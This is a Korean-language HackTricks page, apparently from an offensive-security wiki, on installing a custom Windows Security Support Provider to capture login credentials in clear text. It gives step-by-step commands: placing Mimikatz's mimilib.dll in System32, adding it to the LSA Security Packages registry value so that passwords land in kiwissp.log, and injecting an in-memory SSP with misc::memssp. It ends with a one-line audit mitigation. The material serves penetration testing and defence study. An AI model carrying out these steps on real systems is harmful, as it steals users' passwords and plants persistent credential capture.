# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[SSP(Security Support Provider)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자체 **SSP**를 생성하여 시스템에 액세스하는 데 사용된 **credentials**를 **clear text**로 **capture**할 수 있습니다.

#### Mimilib

Mimikatz에서 제공하는 `mimilib.dll` binary를 사용할 수 있습니다. **이 binary는 모든 credentials를 clear text로 파일 내부에 기록합니다.**\
DLL을 `C:\Windows\System32\`에 넣습니다.\
기존 LSA Security Packages 목록을 가져옵니다:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Security Support Provider 목록(Security Packages)에 `mimilib.dll`을 추가합니다:
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
그리고 재부팅 후 모든 credential은 `C:\Windows\System32\kiwissp.log`에서 clear text로 확인할 수 있습니다.

#### 메모리 내

Mimikatz를 사용하여 이를 메모리에 직접 inject할 수도 있습니다(다소 불안정하거나 작동하지 않을 수 있음):
```bash
privilege::debug
misc::memssp
```
재부팅 후에는 유지되지 않습니다.

#### 완화

Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` 생성/변경 감사

{{#include ../../banners/hacktricks-training.md}}
